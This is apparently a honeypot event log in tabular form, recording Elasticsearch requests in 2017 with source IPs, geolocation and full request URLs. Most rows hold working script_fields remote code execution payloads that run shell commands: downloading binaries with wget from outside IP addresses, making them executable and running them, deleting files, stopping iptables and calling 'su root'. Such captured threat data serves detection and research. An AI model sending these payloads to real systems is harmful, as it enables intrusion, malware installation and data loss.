id	ident	normalized	timestamp	unixTimestamp	week day	year	month	day	hour	minutes	seconds	channel	source_ip	source_ip_num	source_port	destination_ip	destination_ip_num	destination_port	protocol	city	province	province_code	country	country_code	continent	latitude	longitude	asn	method	type	URL	form	user_agent
58ff47b193e0950608bfb02d	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:21.159	1493110641.159	Tue	2017	4	25	8	57	21.159000000000002	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff47b693e0950608bfb02f	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:26.627	1493110646.627	Tue	2017	4	25	8	57	26.627	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffbda293e0950608bfb36d	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:20:34.101	1493140834.101	Tue	2017	4	25	17	20	34.101	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc55f93e0950608bfb3a9	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:35.526	1493142815.526	Tue	2017	4	25	17	53	35.525999999999996	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc56a93e0950608bfb3ab	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:46.350	1493142826.35	Tue	2017	4	25	17	53	46.35	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -c http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-c+http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc56f93e0950608bfb3ad	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:51.722	1493142831.7220001	Tue	2017	4	25	17	53	51.722	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc57593e0950608bfb3af	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:57.077	1493142837.0770001	Tue	2017	4	25	17	53	57.077	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc57a93e0950608bfb3b1	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:54:02.379	1493142842.379	Tue	2017	4	25	17	54	2.379	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffdb5893e0950608bfb42b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:27:20.410	1493148440.41	Tue	2017	4	25	19	27	20.41	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2c393e0950608bfb493	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:58:59.977	1493150339.9770002	Tue	2017	4	25	19	58	59.977	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2d493e0950608bfb495	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:59:16.705	1493150356.705	Tue	2017	4	25	19	59	16.705	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -c http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-c+http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2da93e0950608bfb497	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:59:22.007	1493150362.0070002	Tue	2017	4	25	19	59	22.006999999999998	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2df93e0950608bfb499	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:59:27.292	1493150367.292	Tue	2017	4	25	19	59	27.291999999999998	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2e493e0950608bfb49b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:59:32.590	1493150372.59	Tue	2017	4	25	19	59	32.59	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
59008f4993e0950608bfb8d7	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-26 08:15:05.629	1493194505.629	Wed	2017	4	26	8	15	5.629	elastichoney.events	115.239.248.76	1945106508	None	192.168.10.6	3232238086	9200	None	Shaoxing	Zhejiang	33	China	CN	Asia	30.011	120.5715	No.288 -Fu-chun Road	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./root@p\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./root@p\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
59008f4f93e0950608bfb8d9	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-26 08:15:11.963	1493194511.9629998	Wed	2017	4	26	8	15	11.963	elastichoney.events	115.239.248.76	1945106508	None	192.168.10.6	3232238086	9200	None	Shaoxing	Zhejiang	33	China	CN	Asia	30.011	120.5715	No.288 -Fu-chun Road	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
5900ce4193e0950608bfba69	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-26 12:43:45.934	1493210625.934	Wed	2017	4	26	12	43	45.934	elastichoney.events	115.239.248.76	1945106508	None	192.168.10.6	3232238086	9200	None	Shaoxing	Zhejiang	33	China	CN	Asia	30.011	120.5715	No.288 -Fu-chun Road	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
591074a693e09504fc355fc8	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-05-08 09:37:42.211	1494236262.211	Mon	2017	5	8	9	37	42.211000000000006	elastichoney.events	71.6.146.130	1191613058	None	192.168.10.6	3232238086	9200	None	San Diego	California	CA	United States	US	North America	32.8073	-117.1324	CariNet - Inc.	GET	recon	192.168.10.6:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
5956a08f93e09504c87978fd	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-06-30 15:03:43.105	1498835023.105	Fri	2017	6	30	15	3	43.105	elastichoney.events	222.186.134.8	3736765960	None	192.168.10.4	3232238084	9200	None	Nanjing	Jiangsu	32	China	CN	Asia	32.0617	118.7778	AS Number for CHINANET jiangsu province backbone	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""service iptables stop\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""service+iptables+stop\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
5956a0a093e09504c8797901	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-06-30 15:04:00.001	1498835040.0010002	Fri	2017	6	30	15	4	0.001	elastichoney.events	222.186.134.8	3736765960	None	192.168.10.4	3232238084	9200	None	Nanjing	Jiangsu	32	China	CN	Asia	32.0617	118.7778	AS Number for CHINANET jiangsu province backbone	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -O /tmp/qw http://107.151.137.226:5648/qw\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-O+/tmp/qw+http://107.151.137.226:5648/qw\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
5956a0a193e09504c8797903	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-06-30 15:04:01.073	1498835041.073	Fri	2017	6	30	15	4	1.073	elastichoney.events	222.186.134.8	3736765960	None	192.168.10.4	3232238084	9200	None	Nanjing	Jiangsu	32	China	CN	Asia	32.0617	118.7778	AS Number for CHINANET jiangsu province backbone	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""curl -o /tmp/qw\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""curl+-o+/tmp/qw\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
5956a0a693e09504c8797905	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-06-30 15:04:06.340	1498835046.34	Fri	2017	6	30	15	4	6.34	elastichoney.events	222.186.134.8	3736765960	None	192.168.10.4	3232238084	9200	None	Nanjing	Jiangsu	32	China	CN	Asia	32.0617	118.7778	AS Number for CHINANET jiangsu province backbone	GET	attack	"192.168.10.4:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""su root\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""su+root\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
